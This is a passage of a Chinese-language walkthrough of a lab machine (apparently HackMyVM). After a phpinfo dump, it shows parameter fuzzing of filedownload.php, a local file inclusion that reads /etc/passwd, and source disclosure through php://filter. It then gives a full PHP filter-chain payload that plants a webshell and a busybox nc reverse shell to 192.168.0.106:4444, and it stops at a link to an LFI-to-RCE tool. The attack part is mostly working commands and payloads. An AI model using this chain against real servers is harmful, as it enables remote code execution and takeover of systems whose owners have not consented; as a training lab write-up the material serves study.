$_SERVER['REQUEST_METHOD']	GET
$_SERVER['QUERY_STRING']	no value
$_SERVER['REQUEST_URI']	/phpsysinfo.php
$_SERVER['SCRIPT_NAME']	/phpsysinfo.php
$_SERVER['PHP_SELF']	/phpsysinfo.php
$_SERVER['REQUEST_TIME_FLOAT']	1768288822.58
$_SERVER['REQUEST_TIME']	1768288822
PHP Credits
PHP Group
Thies C. Arntzen, Stig Bakken, Shane Caraveo, Andi Gutmans, Rasmus Lerdorf, Sam Ruby, Sascha Schumann, Zeev Suraski, Jim Winstead, Andrei Zmievski
Language Design & Concept
Andi Gutmans, Rasmus Lerdorf, Zeev Suraski, Marcus Boerger
PHP Authors
Contribution	Authors
Zend Scripting Language Engine 	Andi Gutmans, Zeev Suraski, Stanislav Malyshev, Marcus Boerger, Dmitry Stogov, Xinchen Hui, Nikita Popov
Extension Module API 	Andi Gutmans, Zeev Suraski, Andrei Zmievski
UNIX Build and Modularization 	Stig Bakken, Sascha Schumann, Jani Taskinen, Peter Kokot
Windows Support 	Shane Caraveo, Zeev Suraski, Wez Furlong, Pierre-Alain Joye, Anatol Belski, Kalle Sommer Nielsen
Server API (SAPI) Abstraction Layer 	Andi Gutmans, Shane Caraveo, Zeev Suraski
Streams Abstraction Layer 	Wez Furlong, Sara Golemon
PHP Data Objects Layer 	Wez Furlong, Marcus Boerger, Sterling Hughes, George Schlossnagle, Ilia Alshanetsky
Output Handler 	Zeev Suraski, Thies C. Arntzen, Marcus Boerger, Michael Wallner
Consistent 64 bit support 	Anthony Ferrara, Anatol Belski
SAPI Modules
Contribution	Authors
Apache 2.0 Handler 	Ian Holsman, Justin Erenkrantz (based on Apache 2.0 Filter code)
CGI / FastCGI 	Rasmus Lerdorf, Stig Bakken, Shane Caraveo, Dmitry Stogov
CLI 	Edin Kadribasic, Marcus Boerger, Johannes Schlueter, Moriyoshi Koizumi, Xinchen Hui
Embed 	Edin Kadribasic
FastCGI Process Manager 	Andrei Nigmatulin, dreamcat4, Antony Dovgal, Jerome Loyet
litespeed 	George Wang
phpdbg 	Felipe Pena, Joe Watkins, Bob Weinand
Module Authors
Module	Authors
BC Math 	Andi Gutmans
Bzip2 	Sterling Hughes
Calendar 	Shane Caraveo, Colin Viebrock, Hartmut Holzgraefe, Wez Furlong
COM and .Net 	Wez Furlong
ctype 	Hartmut Holzgraefe
cURL 	Sterling Hughes
Date/Time Support 	Derick Rethans
DB-LIB (MS SQL, Sybase) 	Wez Furlong, Frank M. Kromann, Adam Baratz
DBA 	Sascha Schumann, Marcus Boerger
DOM 	Christian Stocker, Rob Richards, Marcus Boerger
enchant 	Pierre-Alain Joye, Ilia Alshanetsky
EXIF 	Rasmus Lerdorf, Marcus Boerger
FFI 	Dmitry Stogov
fileinfo 	Ilia Alshanetsky, Pierre Alain Joye, Scott MacVicar, Derick Rethans, Anatol Belski
Firebird driver for PDO 	Ard Biesheuvel
FTP 	Stefan Esser, Andrew Skalski
GD imaging 	Rasmus Lerdorf, Stig Bakken, Jim Winstead, Jouni Ahto, Ilia Alshanetsky, Pierre-Alain Joye, Marcus Boerger
GetText 	Alex Plotnick
GNU GMP support 	Stanislav Malyshev
Iconv 	Rui Hirokawa, Stig Bakken, Moriyoshi Koizumi
IMAP 	Rex Logan, Mark Musone, Brian Wang, Kaj-Michael Lang, Antoni Pamies Olive, Rasmus Lerdorf, Andrew Skalski, Chuck Hagenbuch, Daniel R Kalowsky
Input Filter 	Rasmus Lerdorf, Derick Rethans, Pierre-Alain Joye, Ilia Alshanetsky
Internationalization 	Ed Batutis, Vladimir Iordanov, Dmitry Lakhtyuk, Stanislav Malyshev, Vadim Savchuk, Kirti Velankar
JSON 	Jakub Zelenka, Omar Kilani, Scott MacVicar
LDAP 	Amitay Isaacs, Eric Warnke, Rasmus Lerdorf, Gerrit Thomson, Stig Venaas
LIBXML 	Christian Stocker, Rob Richards, Marcus Boerger, Wez Furlong, Shane Caraveo
Multibyte String Functions 	Tsukada Takuya, Rui Hirokawa
MySQL driver for PDO 	George Schlossnagle, Wez Furlong, Ilia Alshanetsky, Johannes Schlueter
MySQLi 	Zak Greant, Georg Richter, Andrey Hristov, Ulf Wendel
MySQLnd 	Andrey Hristov, Ulf Wendel, Georg Richter, Johannes Schlüter
OCI8 	Stig Bakken, Thies C. Arntzen, Andy Sautins, David Benson, Maxim Maletsky, Harald Radi, Antony Dovgal, Andi Gutmans, Wez Furlong, Christopher Jones, Oracle Corporation
ODBC driver for PDO 	Wez Furlong
ODBC 	Stig Bakken, Andreas Karajannis, Frank M. Kromann, Daniel R. Kalowsky
Opcache 	Andi Gutmans, Zeev Suraski, Stanislav Malyshev, Dmitry Stogov, Xinchen Hui
OpenSSL 	Stig Venaas, Wez Furlong, Sascha Kettler, Scott MacVicar
Oracle (OCI) driver for PDO 	Wez Furlong
pcntl 	Jason Greene, Arnaud Le Blanc
Perl Compatible Regexps 	Andrei Zmievski
PHP Archive 	Gregory Beaver, Marcus Boerger
PHP Data Objects 	Wez Furlong, Marcus Boerger, Sterling Hughes, George Schlossnagle, Ilia Alshanetsky
PHP hash 	Sara Golemon, Rasmus Lerdorf, Stefan Esser, Michael Wallner, Scott MacVicar
Posix 	Kristian Koehntopp
PostgreSQL driver for PDO 	Edin Kadribasic, Ilia Alshanetsky
PostgreSQL 	Jouni Ahto, Zeev Suraski, Yasuo Ohgaki, Chris Kings-Lynne
Pspell 	Vlad Krupin
Readline 	Thies C. Arntzen
Reflection 	Marcus Boerger, Timm Friebe, George Schlossnagle, Andrei Zmievski, Johannes Schlueter
Sessions 	Sascha Schumann, Andrei Zmievski
Shared Memory Operations 	Slava Poliakov, Ilia Alshanetsky
SimpleXML 	Sterling Hughes, Marcus Boerger, Rob Richards
SNMP 	Rasmus Lerdorf, Harrie Hazewinkel, Mike Jackson, Steven Lawrance, Johann Hanne, Boris Lytochkin
SOAP 	Brad Lafountain, Shane Caraveo, Dmitry Stogov
Sockets 	Chris Vandomelen, Sterling Hughes, Daniel Beulshausen, Jason Greene
Sodium 	Frank Denis
SPL 	Marcus Boerger, Etienne Kneuss
SQLite 3.x driver for PDO 	Wez Furlong
SQLite3 	Scott MacVicar, Ilia Alshanetsky, Brad Dewar
System V Message based IPC 	Wez Furlong
System V Semaphores 	Tom May
System V Shared Memory 	Christian Cartus
tidy 	John Coggeshall, Ilia Alshanetsky
tokenizer 	Andrei Zmievski, Johannes Schlueter
XML 	Stig Bakken, Thies C. Arntzen, Sterling Hughes
XMLReader 	Rob Richards
xmlrpc 	Dan Libby
XMLWriter 	Rob Richards, Pierre-Alain Joye
XSL 	Christian Stocker, Rob Richards
Zip 	Pierre-Alain Joye, Remi Collet
Zlib 	Rasmus Lerdorf, Stefan Roehrich, Zeev Suraski, Jade Nicoletti, Michael Wallner
PHP Documentation
Authors 	Mehdi Achour, Friedhelm Betz, Antony Dovgal, Nuno Lopes, Hannes Magnusson, Philip Olson, Georg Richter, Damien Seguy, Jakub Vrana, Adam Harvey
Editor 	Peter Cowburn
User Note Maintainers 	Daniel P. Brown, Thiago Henrique Pojda
Other Contributors 	Previously active authors, editors and other contributors are listed in the manual.
PHP Quality Assurance Team
Ilia Alshanetsky, Joerg Behrens, Antony Dovgal, Stefan Esser, Moriyoshi Koizumi, Magnus Maatta, Sebastian Nohn, Derick Rethans, Melvyn Sopacua, Pierre-Alain Joye, Dmitry Stogov, Felipe Pena, David Soria Parra, Stanislav Malyshev, Julien Pauli, Stephen Zarkos, Anatol Belski, Remi Collet, Ferenc Kovacs
Websites and Infrastructure team
PHP Websites Team 	Rasmus Lerdorf, Hannes Magnusson, Philip Olson, Lukas Kahwe Smith, Pierre-Alain Joye, Kalle Sommer Nielsen, Peter Cowburn, Adam Harvey, Ferenc Kovacs, Levi Morrison
Event Maintainers 	Damien Seguy, Daniel P. Brown
Network Infrastructure 	Daniel P. Brown
Windows Infrastructure 	Alex Schoenmaker
PHP License

This program is free software; you can redistribute it and/or modify it under the terms of the PHP License as published by the PHP Group and included in the distribution in the file: LICENSE

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

If you did not receive a copy of the PHP license, or have any questions about PHP licensing, please contact license@php.net.

```

### /prices
![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768290698395-5aa5cd07-7bb2-4c94-907d-0e813391afd4.png)

列目录中存在filedownload.php

[http://192.168.0.100/prices/filedownload.php](http://192.168.0.100/prices/filedownload.php)

访问后发现是空白页

## ffuf
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.0.100/prices/filedownload.php?FUZZ=../index.html -fs 0 -v


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.100/prices/filedownload.php?FUZZ=../index.html
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

:: Progress: [40/6453] :: Job [1/1] :: 0 req/sec :: D:: Progress: [1085/6453] :: Job [1/1] :: 0 req/sec :::: Progress: [2237/6453] :: Job [1/1] :: 0 req/sec ::[Status: 200, Size: 39494, Words: 19456, Lines: 768, Duration: 328ms]
| URL | http://192.168.0.100/prices/filedownload.php?AssignmentForm=../index.html
    * FUZZ: AssignmentForm

:: Progress: [3055/6453] :: Job [1/1] :: 0 req/sec :::: Progress: [3418/6453] :: Job [1/1] :: 0 req/sec :::: Progress: [4523/6453] :: Job [1/1] :: 0 req/sec :::: Progress: [5696/6453] :: Job [1/1] :: 0 req/sec :::: Progress: [6453/6453] :: Job [1/1] :: 0 req/sec :::: Progress: [6453/6453] :: Job [1/1] :: 39 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

| URL | [http://192.168.0.100/prices/filedownload.php?AssignmentForm=../index.html](http://192.168.0.100/prices/filedownload.php?AssignmentForm=../index.html)

    * FUZZ: AssignmentForm

```plain
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:126:131:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
kevin:x:1000:1000:kevin,,,:/home/kevin:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ftp:x:127:134:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
mysql:x:129:135:MySQL Server,,,:/nonexistent:/bin/false
jane:x:1001:1001:,,,:/home/jane:/bin/bash
donald:x:1004:1004::/home/donald:/bin/rbash
randy:x:1002:1002:,,,:/home/randy:/bin/bash
```

```plain
http://192.168.0.100/prices/filedownload.php?AssignmentForm=php://filter//convert.base64-encode/resource=filedownload.php  
```

尝试读取源代码

```plain
PD9waHAKICAgJGZpbGUgPSAkX0dFVFsnQXNzaWdubWVudEZvcm0nXTsKICAgaWYoaXNzZXQoJGZpbGUpKQogICB7CiAgICAgICBpbmNsdWRlKCIkZmlsZSIpOwogICB9CiAgIGVsc2UKICAgewogICAgICAgaW5jbHVkZSgiaW5kZXgucGhwIik7CiAgIH0KICAgPz4K
```

```plain
<?php
   $file = $_GET['AssignmentForm'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("index.php");
   }
   ?>

```

## 方法一：php伪协议链反弹shell
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/php_filter_chain_generator-main]
└─# python php_filter_chain_generator.py --chain "<?php system(\$_GET['0']);?>"
[+] The following gadget chain will generate the following code : <?php system($_GET['0']);?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWycwJ10pOz8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

```plain
http://192.168.0.100/prices/filedownload.php?AssignmentForm=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=whoami
```

```plain
http://192.168.0.100/prices/filedownload.php?AssignmentForm=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=busybox%20nc%20192.168.0.106%204444%20-e%20bash
```

## 方法二：使用 phpinfo 从 LFI 转 RCE
[https://github.com/roughiz/lfito_rce](https://github.com/roughiz/lfito_rce)

```plain
